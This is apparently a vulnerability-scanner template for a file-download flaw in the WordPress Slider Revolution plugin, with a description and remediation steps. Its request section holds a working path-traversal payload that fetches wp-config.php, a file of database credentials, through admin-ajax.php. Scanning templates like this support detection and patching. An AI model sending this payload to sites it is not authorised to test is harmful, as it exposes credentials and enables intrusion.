id: CNVD-2014-04714
info:
  name: WordPress Plugin Slider REvolution_4.1.4_Any file download
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Slider Revolution Responsive 'img' parameter arbitrary file download vulnerability
    WordPress is a blog platform developed by the WordPress Software Foundation using the PHP language. The platform supports the establishment of personal blog websites on PHP and MySQL servers.

    There is an arbitrary file download vulnerability in the 'img' parameter of the WordPress plugin Slider Revolution, which allows an attacker to exploit the vulnerability to download arbitrary files from the web server and obtain sensitive information.
  reference:
  - https://www.exploit-db.com/exploits/36554
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: http://www.wonderplugin.com/wordpress-slider/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"<?php")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
  method: GET
